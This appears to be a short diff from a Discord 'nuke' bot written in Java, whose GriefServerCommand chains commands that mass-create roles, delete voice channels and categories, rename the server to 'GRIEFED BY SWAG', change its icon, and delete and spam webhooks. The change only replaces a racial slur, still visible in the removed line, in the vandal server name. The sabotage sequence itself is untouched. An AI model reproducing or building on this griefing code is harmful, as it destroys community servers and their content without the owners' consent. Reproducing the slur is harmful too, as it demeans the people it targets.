@@ -20,7 +20,7 @@ public class GriefServerCommand implements ICommand {
         event.getChannel().sendMessage(Core.PREFIX + "addroles 200").queueAfter(2, TimeUnit.SECONDS);
         event.getChannel().sendMessage(Core.PREFIX + "dvc").queueAfter(3, TimeUnit.SECONDS);
         event.getChannel().sendMessage(Core.PREFIX + "dcat").queueAfter(4, TimeUnit.SECONDS);
-        event.getChannel().sendMessage(Core.PREFIX + "servername GRIEFED BY SWAG LLL NIGGA LLL").queueAfter(5, TimeUnit.SECONDS);
+        event.getChannel().sendMessage(Core.PREFIX + "servername GRIEFED BY SWAG LLL LLL LLL").queueAfter(5, TimeUnit.SECONDS);
         event.getChannel().sendMessage(Core.PREFIX + "changeicon").queueAfter(6, TimeUnit.SECONDS);
         event.getChannel().sendMessage(Core.PREFIX + "delwebhooks").queueAfter(7, TimeUnit.SECONDS);
         event.getChannel().sendMessage(Core.PREFIX + "createwebhooks 10").queueAfter(8, TimeUnit.SECONDS);
